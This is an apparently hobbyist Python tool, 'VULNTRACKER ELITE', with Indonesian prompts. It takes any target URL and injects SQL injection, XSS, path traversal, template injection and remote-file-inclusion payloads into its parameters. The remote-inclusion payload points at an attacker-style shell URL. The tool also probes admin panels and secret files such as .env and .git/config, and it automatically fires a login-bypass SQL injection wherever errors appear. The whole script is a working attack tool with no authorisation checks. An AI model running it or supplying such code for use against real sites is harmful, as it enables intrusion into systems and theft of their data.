import requests
from urllib.parse import urlparse, parse_qs
from tqdm import tqdm
import time
import tkinter as tk
from tkinter import messagebox
import threading
import os
import webbrowser
import subprocess

# === CONFIG ===
HEADERS = {
    "User-Agent": "Mozilla/5.0 (VULNTRACKER)"
}
TIMEOUT = 6
SAVE_FILE = "vuln_results.txt"

# === PAYLOADS ===
PAYLOADS = {
    "SQLi": ["'", "' OR 1=1--", "\" OR \"1\"=\"1", "' OR sleep(5)--", "admin'--", "' OR '1'='1' /*"],
    "XSS": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
    "LFI": ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"],
    "SSTI": ["{{7*7}}", "${7*7}"],
    "RFI": ["http://evil.com/shell.txt"]
}

ADMIN_PATHS = ["/admin", "/administrator", "/cpanel", "/admin.php", "/login"]
SENSITIVE_FILES = ["/.env", "/.git/config", "/backup.zip", "/db.sql", "/config.bak"]

HEADERS_ISSUES = ["X-Frame-Options", "Content-Security-Policy", "X-Content-Type-Options"]

def save_result(url, vuln_type, payload):
    with open(SAVE_FILE, "a") as f:
        f.write(f"[VULNERABLE] {url} => {vuln_type} using {payload}\n")

def check_headers(url):
    try:
        r = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        missing = [h for h in HEADERS_ISSUES if h not in r.headers]
        if missing:
            print(f"[⚠️] {url} missing headers: {missing}")
            save_result(url, "Missing Headers", ','.join(missing))
    except:
        pass

def check_admin(url):
    for path in ADMIN_PATHS:
        try:
            full = url + path
            r = requests.get(full, headers=HEADERS, timeout=TIMEOUT)
            if r.status_code == 200:
                print(f"[🔐] Admin panel found: {full}")
                save_result(full, "Admin Panel", path)
        except:
            continue

def check_sensitive_files(url):
    for path in SENSITIVE_FILES:
        try:
            full = url + path
            r = requests.get(full, headers=HEADERS, timeout=TIMEOUT)
            if r.status_code == 200 and len(r.text) > 10:
                print(f"[📁] Sensitive file found: {full}")
                save_result(full, "Sensitive File", path)
        except:
            continue

def auto_exploit_sql(url):
    exploit_url = url + "' OR 1=1--"
    print(f"[💣] Attempting auto SQLi exploit: {exploit_url}")
    try:
        r = requests.get(exploit_url, headers=HEADERS, timeout=TIMEOUT)
        with open(SAVE_FILE, "a") as f:
            f.write(f"[AUTO EXPLOIT] {exploit_url}\n")
        print(f"[✅] Exploit sent. Check if bypassed login or dumped data.")
    except:
        print("[❌] Exploit failed.")

def test_payloads(url):
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    queries = parse_qs(parsed.query)

    if not queries:
        print("❌ No parameters to test.")
        return

    for vuln_type, payloads in PAYLOADS.items():
        for param in queries:
            for payload in tqdm(payloads, desc=f"{vuln_type}-{param}"):
                mod_params = queries.copy()
                mod_params[param] = payload
                query = "&".join([f"{k}={v}" for k,v in mod_params.items()])
                full_url = f"{base}?{query}"
                try:
                    start = time.time()
                    r = requests.get(full_url, headers=HEADERS, timeout=TIMEOUT)
                    duration = time.time() - start
                    if any(x in r.text.lower() for x in ["error", "sql", "unexpected", "alert"]):
                        print(f"[🔥] {vuln_type} DETECTED at: {full_url}")
                        save_result(full_url, vuln_type, payload)
                        if vuln_type == "SQLi":
                            auto_exploit_sql(full_url)
                    elif "sleep" in payload and duration > 4:
                        print(f"[⏱️] TIME DELAY VULN: {full_url}")
                        save_result(full_url, vuln_type, payload)
                except:
                    continue

def fingerprint_tech(url):
    try:
        r = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        server = r.headers.get("Server", "Unknown")
        powered = r.headers.get("X-Powered-By", "Unknown")
        print(f"[🔍] Server: {server}, Powered-by: {powered}")
    except:
        pass

def start_scan(target):
    print("\n=== VULNTRACKER ELITE ===")
    test_payloads(target)
    check_admin(target)
    check_sensitive_files(target)
    check_headers(target)
    fingerprint_tech(target)
    print(f"\n✅ Scan complete. Cek hasil di: {SAVE_FILE}")

# === GUI ===
def gui_start():
    def scan():
        target = entry.get()
        if not target:
            messagebox.showwarning("Input Needed", "Masukkan URL dulu bro!")
            return
        threading.Thread(target=start_scan, args=(target,), daemon=True).start()

    def open_with_kali_viewer():
        try:
            subprocess.Popen(["mousepad", SAVE_FILE])  # Bisa diganti leafpad, gedit, dll
        except Exception as e:
            messagebox.showerror("Gagal buka file", f"{e}")

    app = tk.Tk()
    app.title("💣 VULNTRACKER ELITE GUI")
    app.geometry("420x200")
    app.config(bg="#1f1f1f")

    tk.Label(app, text="Masukkan URL target:", fg="white", bg="#1f1f1f").pack(pady=10)
    entry = tk.Entry(app, width=50)
    entry.pack(pady=5)
    tk.Button(app, text="🚀 Mulai Scan", command=scan, bg="#00aa00", fg="white").pack(pady=10)
    tk.Button(app, text="📂 Buka Hasil (Kali View)", command=open_with_kali_viewer, bg="#444", fg="white").pack()

    app.mainloop()

if __name__ == "__main__":
    mode = input("\nMode? (1 = CLI / 2 = GUI): ")
    if mode == "2":
        gui_start()
    else:
        target = input("🌐 Masukkan URL target (dengan param jika ada):\n> ")
        start_scan(target)
